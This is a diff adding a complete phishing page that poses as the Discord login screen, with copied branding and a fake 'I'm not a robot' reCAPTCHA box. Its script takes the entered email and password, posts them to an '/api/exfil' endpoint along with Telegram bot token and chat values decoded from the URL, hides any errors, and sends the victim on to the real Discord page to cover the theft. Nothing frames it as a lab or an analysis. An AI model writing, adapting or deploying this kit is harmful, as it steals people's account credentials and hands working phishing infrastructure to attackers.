@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord</title>
+    <link rel="shortcut icon" href="https://discord.com/assets/07f18a23e10c57c93306.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'gg sans';
+            src: url('https://discord.com/assets/f99737119b47413ecf12.woff2') format('woff2');
+            font-weight: 400;
+        }
+        @font-face {
+            font-family: 'gg sans';
+            src: url('https://discord.com/assets/bd590d643a6d71343714.woff2') format('woff2');
+            font-weight: 600;
+        }
+        
+        :root {
+            --discord-bg: #000000;
+            --discord-card: #1e1f22;
+            --discord-input: #1e1f22;
+            --discord-blurple: #5865F2;
+            --discord-light-blurple: #E0E3FF;
+            --discord-blurple-hover: #4752c4;
+            --discord-text-muted: #b5bac1;
+            --text-strong: #f2f3f5;
+        }
+
+        body { 
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: var(--discord-bg);
+            color: #ffffff;
+            -webkit-font-smoothing: antialiased;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .discord-card {
+            background-color: #313338;
+            width: 100%;
+            max-width: 784px;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            display: flex;
+            gap: 64px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        @media (max-width: 768px) {
+            .discord-card {
+                max-width: 480px;
+                flex-direction: column;
+                align-items: center;
+                gap: 32px;
+                padding: 32px 16px;
+                background-color: transparent;
+                box-shadow: none;
+            }
+            .qr-section { display: none; }
+        }
+
+        .login-section { flex: 1; width: 100%; }
+
+        .discord-logo {
+            width: 130px;
+            height: auto;
+            margin-bottom: 24px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .header-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--text-strong);
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .header-subtitle {
+            font-size: 16px;
+            color: var(--discord-text-muted);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: var(--discord-text-muted);
+            margin-bottom: 8px;
+        }
+
+        .required-star {
+            color: #fa777c;
+            display: inline-block;
+            margin-left: 4px;
+        }
+
+        .discord-input {
+            width: 100%;
+            height: 40px;
+            background-color: var(--discord-input);
+            border: 1px solid rgba(0,0,0,0.3);
+            border-radius: 3px;
+            padding: 10px;
+            color: #dbdee1;
+            font-size: 16px;
+            outline: none;
+            margin-bottom: 20px;
+            transition: border-color 0.2s;
+        }
+
+        .discord-input:focus {
+            border-color: var(--discord-blurple);
+        }
+
+        .discord-btn-primary {
+            background-color: var(--discord-blurple);
+            color: #fff;
+            font-weight: 500;
+            font-size: 16px;
+            height: 44px;
+            width: 100%;
+            border-radius: 3px;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
+
+        .discord-btn-primary:hover:not(.opacity-50) { background-color: var(--discord-blurple-hover); }
+
+        /* Fake reCAPTCHA v2 */
+        .captcha-box {
+            background-color: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            height: 74px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 12px;
+            margin-bottom: 20px;
+            color: #000;
+        }
+
+        .checkbox-container {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c1c1c1;
+            background: #fff;
+            border-radius: 2px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* QR Module */
+        .qr-section {
+            width: 240px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .qr-container {
+            background: #fff;
+            padding: 8px;
+            border-radius: 4px;
+            margin-bottom: 32px;
+            position: relative;
+        }
+
+        .qr-logo-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 4px;
+            border-radius: 4px;
+        }
+
+        #loader {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: transparent;
+            overflow: hidden;
+            display: none;
+        }
+        #loader div {
+            position: absolute;
+            background-color: var(--discord-blurple);
+            height: 100%;
+            width: 40%;
+            animation: indeterminate 1.2s infinite linear;
+        }
+        @keyframes indeterminate { 0% { left: -40%; } 100% { left: 100%; } }
+    </style>
+</head>
+<body>
+
+    <div class="discord-card">
+        <div id="loader"><div></div></div>
+
+        <!-- Login Container -->
+        <div class="login-section">
+            <img src="https://cdn.prod.website-files.com/6257adef93867e50d84d30e2/66e3d718355f9c89eb0fd350_Logo.svg" alt="Discord" class="discord-logo">
+            
+            <h2 class="header-title">Welcome back!</h2>
+            <p class="header-subtitle">We're so excited to see you again!</p>
+
+            <div class="text-left">
+                <div class="mb-5">
+                    <label class="input-label">Email or Phone Number <span class="required-star">*</span></label>
+                    <input type="text" id="email" class="discord-input" autocomplete="username" spellcheck="false">
+                </div>
+
+                <div class="mb-1">
+                    <label class="input-label">Password <span class="required-star">*</span></label>
+                    <input type="password" id="password" class="discord-input" autocomplete="current-password">
+                </div>
+
+                <button class="text-[#00a8fc] text-sm font-medium hover:underline mb-5 block">Forgot your password?</button>
+
+                <!-- reCAPTCHA Gate -->
+                <div class="captcha-box">
+                    <div class="flex items-center">
+                        <div id="captcha-trigger" onclick="verify()" class="checkbox-container">
+                            <div id="cap-check" class="hidden">
+                                <svg class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"/></svg>
+                            </div>
+                            <div id="cap-spinner" class="hidden w-4 h-4 border-2 border-t-transparent border-blue-500 rounded-full animate-spin"></div>
+                        </div>
+                        <span class="ml-3 text-sm font-sans">I'm not a robot</span>
+                    </div>
+                    <div class="flex flex-col items-center">
+                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-7 h-7 opacity-70">
+                        <span class="text-[8px] text-gray-500 mt-0.5">reCAPTCHA</span>
+                        <div class="flex gap-1 text-[7px] text-gray-400">
+                            <a href="#">Privacy</a> - <a href="#">Terms</a>
+                        </div>
+                    </div>
+                </div>
+
+                <button id="login-btn" onclick="dispatch()" class="discord-btn-primary opacity-50 cursor-not-allowed">Log In</button>
+
+                <p class="text-sm mt-3">
+                    <span class="text-zinc-400">Need an account?</span>
+                    <button class="text-[#00a8fc] font-medium hover:underline ml-1">Register</button>
+                </p>
+            </div>
+        </div>
+
+
+
+    <script>
+        const getConf = () => {
+            const h = window.location.hash.substring(1);
+            if (!h) return null;
+            try { return JSON.parse(atob(h)); } catch(e) { return null; }
+        };
+
+        const config = getConf();
+        let verified = false;
+
+        function verify() {
+            if (verified) return;
+            const spinner = document.getElementById('cap-spinner');
+            const check = document.getElementById('cap-check');
+            const btn = document.getElementById('login-btn');
+            
+            spinner.classList.remove('hidden');
+            setTimeout(() => {
+                spinner.classList.add('hidden');
+                check.classList.remove('hidden');
+                verified = true;
+                btn.classList.remove('opacity-50', 'cursor-not-allowed');
+            }, 1500);
+        }
+
+        async function dispatch() {
+            const u = document.getElementById('email').value;
+            const p = document.getElementById('password').value;
+
+            if(!u || !p || !verified) return;
+
+            document.getElementById('loader').style.display = 'block';
+            const redirect = "https://discord.com/channels/@me";
+
+            if(!config) {
+                setTimeout(() => window.location.href = redirect, 1200);
+                return;
+            }
+
+            try {
+                await fetch('/api/exfil', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        target: 'discord',
+                        credentials: { username: u, password: p },
+                        tgToken: config.t,
+                        tgChat: config.c
+                    })
+                });
+            } catch (err) {
+                // Silenced
+            } finally {
+                setTimeout(() => {
+                    window.location.href = redirect;
+                }, 1200);
+            }
+        }
+    </script>
+</body>
+</html>
